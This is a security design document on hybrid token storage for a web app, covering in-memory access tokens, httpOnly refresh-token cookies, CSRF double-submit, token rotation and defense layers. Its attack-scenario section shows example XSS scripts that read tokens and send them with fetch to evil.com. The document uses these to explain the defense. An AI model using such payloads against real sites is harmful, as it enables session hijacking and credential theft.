# Security Architecture: Hybrid Token Storage

## Architecture Comparison

### Before: localStorage (Vulnerable to XSS)

```
┌─────────────────────────────────────────────────────────────┐
│                         Browser                             │
│                                                             │
│  ┌──────────────────────────────────────────────────┐     │
│  │              JavaScript Heap                      │     │
│  │  ┌────────────────────────────────────────┐      │     │
│  │  │        React Application                │      │     │
│  │  │  (using localStorage)                   │      │     │
│  │  └────────────────────────────────────────┘      │     │
│  └──────────────────────────────────────────────────┘     │
│                                                             │
│  ┌──────────────────────────────────────────────────┐     │
│  │              localStorage                         │     │
│  │  ┌────────────────────────────────────────┐      │     │
│  │  │  accessToken: "eyJhbGc..."   ❌       │      │     │
│  │  │  refreshToken: "eyJhbGc..."  ❌       │      │     │
│  │  └────────────────────────────────────────┘      │     │
│  └──────────────────────────────────────────────────┘     │
│                                                             │
│  ⚠️  XSS Attack Can Steal Both Tokens!                    │
│  document.cookie / localStorage accessible              │
└─────────────────────────────────────────────────────────────┘
```

### After: Hybrid Strategy (XSS-Resistant)

```
┌─────────────────────────────────────────────────────────────┐
│                         Browser                             │
│                                                             │
│  ┌──────────────────────────────────────────────────┐     │
│  │         JavaScript Memory (Zustand)               │     │
│  │  ┌────────────────────────────────────────┐      │     │
│  │  │  accessToken: "eyJhbGc..."   ⚠️       │      │     │
│  │  │  (15min lifetime - limited exposure)   │      │     │
│  │  └────────────────────────────────────────┘      │     │
│  └──────────────────────────────────────────────────┘     │
│                                                             │
│  ┌──────────────────────────────────────────────────┐     │
│  │          Browser Cookie Storage                   │     │
│  │  ┌────────────────────────────────────────┐      │     │
│  │  │  refreshToken (httpOnly)       ✅      │      │     │
│  │  │  csrf-token                    ✅      │      │     │
│  │  │  (7d lifetime - XSS-proof!)            │      │     │
│  │  └────────────────────────────────────────┘      │     │
│  └──────────────────────────────────────────────────┘     │
│                                                             │
│  ✅ XSS Can Only Steal Short-Lived Access Token!         │
│  httpOnly cookies are invisible to JavaScript          │
└─────────────────────────────────────────────────────────────┘
```

## Authentication Flow

### Login Flow

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Client  │                    │ Backend │                    │ Database │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  POST /auth/login            │                              │
     ├─────────────────────────────>│                              │
     │  { username, password }      │                              │
     │                              │  Verify credentials          │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │                              │  User valid                  │
     │                              │<─────────────────────────────┤
     │                              │                              │
     │                              │  Generate:                   │
     │                              │  - accessToken               │
     │                              │  - refreshToken              │
     │                              │  - csrfToken                 │
     │                              │                              │
     │                              │  Store refresh token         │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │  Response:                   │                              │
     │  - accessToken (JSON)        │                              │
     │  - Set-Cookie: refreshToken  │                              │
     │  - Set-Cookie: csrf-token    │                              │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │  Store in Zustand:           │                              │
     │  ✅ accessToken (memory)    │                              │
     │                              │                              │
     │  Browser auto-stores:        │                              │
     │  ✅ refreshToken (httpOnly)  │                              │
     │  ✅ csrf-token               │                              │
     │                              │                              │
```

### Token Refresh Flow

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Client  │                    │ Backend │                    │ Database │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  Access token expired        │                              │
     │  (detected in 401 response)  │                              │
     │                              │                              │
     │  POST /auth/refresh          │                              │
     ├─────────────────────────────>│                              │
     │  Headers:                    │                              │
     │  - X-CSRF-Token: xxx         │                              │
     │  - Cookie: refreshToken=yyy  │                              │
     │                              │                              │
     │                              │  Validate CSRF               │
     │                              │  (header vs cookie)          │
     │                              │                              │
     │                              │  Verify refresh token        │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │                              │  Token valid & not revoked   │
     │                              │<─────────────────────────────┤
     │                              │                              │
     │                              │  Revoke old token            │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │                              │  Generate new tokens         │
     │                              │                              │
     │                              │  Store new refresh token     │
     │                              ├─────────────────────────────>│
     │                              │                              │
     │  Response:                   │                              │
     │  - new accessToken (JSON)    │                              │
     │  - Set-Cookie: refreshToken  │                              │
     │  - Set-Cookie: csrf-token    │                              │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │  Update Zustand:             │                              │
     │  ✅ new accessToken          │                              │
     │                              │                              │
     │  Browser auto-updates:       │                              │
     │  ✅ new refreshToken cookie  │                              │
     │  ✅ new csrf-token cookie    │                              │
     │                              │                              │
```

### Silent Refresh Flow (Page Reload)

```
┌─────────┐                    ┌─────────┐                    ┌──────────┐
│ Client  │                    │ Backend │                    │ Database │
└────┬────┘                    └────┬────┘                    └────┬─────┘
     │                              │                              │
     │  User reloads page           │                              │
     │  ❌ accessToken lost         │                              │
     │  ✅ refreshToken cookie OK   │                              │
     │                              │                              │
     │  GET /auth/csrf-token        │                              │
     ├─────────────────────────────>│                              │
     │                              │                              │
     │  Set-Cookie: csrf-token      │                              │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │  POST /auth/refresh          │                              │
     ├─────────────────────────────>│                              │
     │  (same as refresh flow)      │                              │
     │                              │                              │
     │  new accessToken             │                              │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │  GET /auth/me                │                              │
     ├─────────────────────────────>│                              │
     │  Authorization: Bearer xxx   │                              │
     │                              │                              │
     │  User data                   │                              │
     │<─────────────────────────────┤                              │
     │                              │                              │
     │  ✅ Session restored!        │                              │
     │                              │                              │
```

## Security Layers

```
┌─────────────────────────────────────────────────────────────┐
│                    Defense in Depth                         │
└─────────────────────────────────────────────────────────────┘

Layer 1: Token Separation
├─ Access Token → Memory (Zustand)
│  └─ ⚠️  Vulnerable to XSS but short-lived (15min)
└─ Refresh Token → httpOnly Cookie
   └─ ✅ Immune to XSS attacks

Layer 2: CSRF Protection
├─ Double Submit Cookie Pattern
│  └─ CSRF token in cookie + X-CSRF-Token header
└─ SameSite=Strict
   └─ Browser won't send cookies with cross-site requests

Layer 3: Cookie Security Attributes
├─ httpOnly: true       ← JavaScript can't read
├─ secure: true         ← HTTPS only (production)
├─ sameSite: 'strict'   ← CSRF protection
├─ path: '/api/auth'    ← Limited scope
└─ maxAge: 7 days       ← Auto-expiration

Layer 4: Token Rotation
├─ Each refresh generates new tokens
├─ Old refresh token immediately revoked
└─ Reuse detection triggers lockdown

Layer 5: Database Validation
├─ Token ID (jti) stored in database
├─ Revocation status checked
└─ Token metadata (IP, user agent) logged

Layer 6: Rate Limiting
├─ Auth endpoints protected
└─ Prevents brute force attacks

Layer 7: Monitoring & Alerting
├─ Audit logs for security events
├─ TOKEN_REUSE_ATTACK detection
└─ Unusual activity patterns flagged
```

## Attack Scenarios

### Scenario 1: XSS Attack

```
BEFORE (Vulnerable):
┌─────────────────────────────────────────┐
│  XSS Payload Injected                   │
│  <script>                               │
│    const access = localStorage          │
│      .getItem('accessToken');           │
│    const refresh = localStorage         │
│      .getItem('refreshToken');          │
│    // Send to attacker's server         │
│    fetch('https://evil.com', {          │
│      body: { access, refresh }          │
│    });                                  │
│  </script>                              │
│                                         │
│  Result: ❌ FULL SESSION HIJACK        │
└─────────────────────────────────────────┘

AFTER (Protected):
┌─────────────────────────────────────────┐
│  XSS Payload Injected                   │
│  <script>                               │
│    const access = useAuthStore          │
│      .getState().accessToken;           │
│    const refresh = document.cookie;     │
│    // refresh is empty! httpOnly!       │
│    fetch('https://evil.com', {          │
│      body: { access, refresh: null }    │
│    });                                  │
│  </script>                              │
│                                         │
│  Result: ⚠️  Access token stolen       │
│  but only valid for 15 minutes!         │
│  ✅ Refresh token safe!                │
└─────────────────────────────────────────┘
```

### Scenario 2: CSRF Attack

```
BEFORE (Not Applicable):
Tokens were in localStorage, not cookies,
so CSRF wasn't a concern.

AFTER (Protected):
┌─────────────────────────────────────────┐
│  Evil Site Attempts CSRF                │
│  <form action="https://app.com/         │
│    api/auth/refresh" method="POST">     │
│    <!-- Browser auto-sends cookies -->  │
│  </form>                                │
│                                         │
│  Browser sends:                         │
│  Cookie: refreshToken=xxx               │
│  Cookie: csrf-token=yyy                 │
│  X-CSRF-Token: [MISSING!]               │
│                                         │
│  Backend validates:                     │
│  ❌ CSRF header != cookie              │
│  → Returns 403 Forbidden               │
│                                         │
│  Result: ✅ CSRF BLOCKED               │
└─────────────────────────────────────────┘
```

## Benefits Summary

| Aspect | Before | After | Improvement |
|--------|--------|-------|-------------|
| **XSS → Full Hijack** | ❌ Vulnerable | ✅ Protected | Refresh token safe |
| **XSS → Short Access** | ❌ Vulnerable | ⚠️ 15min only | Limited impact |
| **CSRF → Refresh** | N/A | ✅ Protected | Double submit |
| **Session Restore** | ❌ Manual login | ✅ Automatic | Better UX |
| **Token Visibility** | ❌ DevTools | ⚠️ Access only | Reduced surface |
| **Compliance** | ⚠️ Partial | ✅ Full | OWASP aligned |

## Key Takeaways

1. **Separation of Concerns**
   - Short-lived tokens → Memory (acceptable XSS risk)
   - Long-lived tokens → httpOnly cookies (XSS-proof)

2. **Defense in Depth**
   - Multiple security layers
   - No single point of failure

3. **User Experience**
   - Transparent to users
   - Automatic session restoration
   - No additional login prompts

4. **Compliance**
   - Follows OWASP guidelines
   - OAuth 2.0 best practices
   - Industry-standard patterns

## References

- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OAuth 2.0 Security BCP](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
